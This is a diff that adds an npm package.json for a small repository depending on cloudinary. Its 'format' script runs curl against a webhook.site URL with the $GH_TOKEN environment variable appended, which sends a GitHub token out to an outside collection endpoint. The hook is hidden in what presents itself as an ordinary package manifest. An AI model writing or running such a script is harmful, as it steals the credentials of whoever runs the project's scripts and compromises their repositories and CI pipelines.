@@ -1,0 +1,23 @@
+{
+  "name": "some_repo",
+  "version": "1.0.0",
+  "description": "test",
+  "main": "index.js",
+  "scripts": {
+    "install": "echo 'Installing fork $$$$$$$$$$$$$'",
+    "format": "echo 'Formatting $$$$$$$$$$$$$' && curl https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/formatting/$GH_TOKEN"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/madder-g/some_repo.git"
+  },
+  "author": "",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/madder-g/some_repo/issues"
+  },
+  "homepage": "https://github.com/madder-g/some_repo#readme",
+  "dependencies": {
+    "cloudinary": "2.3.1"
+  }
+}
